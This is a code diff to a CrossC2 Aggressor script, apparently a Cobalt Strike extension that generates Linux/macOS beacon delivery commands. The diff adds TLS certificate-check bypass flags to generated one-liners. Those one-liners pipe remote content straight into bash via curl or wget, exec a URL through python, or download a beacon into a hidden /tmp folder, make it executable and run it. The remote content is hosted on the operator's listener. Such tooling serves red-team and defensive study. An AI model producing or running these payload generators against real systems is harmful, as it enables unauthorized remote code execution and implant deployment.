@@ -155,7 +155,7 @@ sub createCrossC2ListenerDialogCallBack {
         # create libbeacon data
         $genCC2_lib = $CC2_PATH . $CC2_BIN;  
         $genCC2_lib = $genCC2_lib." ".$domain." ". $port." ".$beaconKeyPath." ".$rebind_lib." ".$system."-lib ".$arch." ".$outputFileName.".lib";
-        if (($cs_version eq "4.4") && ($payload_type eq "Stageless")) {
+        if (($cs_version eq "4.4 - source version") && ($payload_type eq "Stageless")) {
             $genCC2_lib = $genCC2_lib." stageless 4.4";
         }
         elog($genCC2_lib);
@@ -235,7 +235,7 @@ sub createCrossC2Listener {
     if ($reverse_https_flag) {
         drow_checkbox($dialog, "enableSSL", "SSL: ", "Enable SSL");
     }
-    drow_combobox($dialog, "cs_version", "CS Version: ", @("<= 4.3", "4.4"));
+    drow_combobox($dialog, "cs_version", "CS Version: ", @("<= 4.4", "4.4 - source version"));
     dbutton_action($dialog, "Build");
     dialog_show($dialog);
 }
@@ -259,11 +259,20 @@ sub genDownloadPayload {
     local('$type $payloadContentURL $downloadURL');
     $type = $1;
     $payloadContentURL = $2;
+    $enableSSL = $3;
     $downloadURL = "";
     if ($type eq "curl") {
-        $downloadURL = "curl -A O -o- -L ".$payloadContentURL." | bash -s";
+        $bypassSSL = "";
+        if ($enableSSL eq 'true') {
+            $bypassSSL = "-k";
+        }
+        $downloadURL = "curl -A O ".$bypassSSL." -o- -L ".$payloadContentURL." | bash -s";
     } else if ($type eq "wget") {
-        $downloadURL = "wget -U O -O - ".$payloadContentURL." | bash -s";
+        $bypassSSL = "";
+        if ($enableSSL eq 'true') {
+            $bypassSSL = "--no-check-certificate";
+        }
+        $downloadURL = "wget -U O ".$bypassSSL." -O - ".$payloadContentURL." | bash -s";
     } else if ($type eq "python") {
         $downloadURL = "python -c \"import urllib2; exec urllib2.urlopen('".$payloadContentURL."').read()\"";
     } else if ($type eq "php") {
@@ -286,6 +295,7 @@ sub genDownloadPayloadContent {
     $beaconUrl = $2;
     $payload = "";
     $processName = $3;
+    $enableSSL = $4;
 
     $targetSaveDir = random_string(5);
     $targetSaveDir = '.'.$targetSaveDir.'';
@@ -295,7 +305,11 @@ sub genDownloadPayloadContent {
     if ($type eq "curl") {
         $payload = "mkdir /tmp/".$targetSaveDir.";";
         $payload = $payload." rm -f ".$targetSavePath.";";
-        $payload = $payload." curl -A O -L ".$beaconUrl." -o ".$targetSavePath.";";
+        $bypassSSL = "";
+        if ($enableSSL eq 'true') {
+            $bypassSSL = "-k";
+        }
+        $payload = $payload." curl -A O ".$bypassSSL." -L ".$beaconUrl." -o ".$targetSavePath.";";
         $payload = $payload." chmod 755 ".$targetSavePath.";";
         $payload = $payload." ".$targetSavePath.";";
         $payload = $payload." sleep 10;";
@@ -303,7 +317,11 @@ sub genDownloadPayloadContent {
     } else if ($type eq "wget") {
         $payload = "mkdir /tmp/".$targetSaveDir.";";
         $payload = $payload." rm -f ".$targetSavePath.";";
-        $payload = $payload." wget -U 'O' ".$beaconUrl." -O ".$targetSavePath.";";
+        $bypassSSL = "";
+        if ($enableSSL eq 'true') {
+            $bypassSSL = "--no-check-certificate";
+        }
+        $payload = $payload." wget -U 'O' ".$bypassSSL." ".$beaconUrl." -O ".$targetSavePath.";";
         $payload = $payload." chmod 755 ".$targetSavePath.";";
         $payload = $payload." ".$targetSavePath.";";
         $payload = $payload." sleep 10;";
@@ -402,7 +420,7 @@ sub genCrossC2ScriptDialogCallback {
     $listenerinfo = @($needCheckBeaconSiteName, $beaconUrl);
 
     # gen payloadContent
-    $payloadContent = genDownloadPayloadContent($type, $beaconUrl, $processName);
+    $payloadContent = genDownloadPayloadContent($type, $beaconUrl, $processName, $enableSSL);
     # host payloadContent
     if ($enableSSL eq 'true') {
         $payloadContentURL = site_host($lhost, $lport, $uri, $payloadContent, "automatic", "Script (".$type."-https) {".$listenerinfo[0]."}", true);
@@ -411,7 +429,7 @@ sub genCrossC2ScriptDialogCallback {
     }
     
     # gen payload
-    $scriptUrl = genDownloadPayload($type, $payloadContentURL);
+    $scriptUrl = genDownloadPayload($type, $payloadContentURL, $enableSSL);
     # add_to_clipboard($scriptUrl);
     prompt_text("Copy/Paste One-liner: ", $scriptUrl, {});
     elog("");
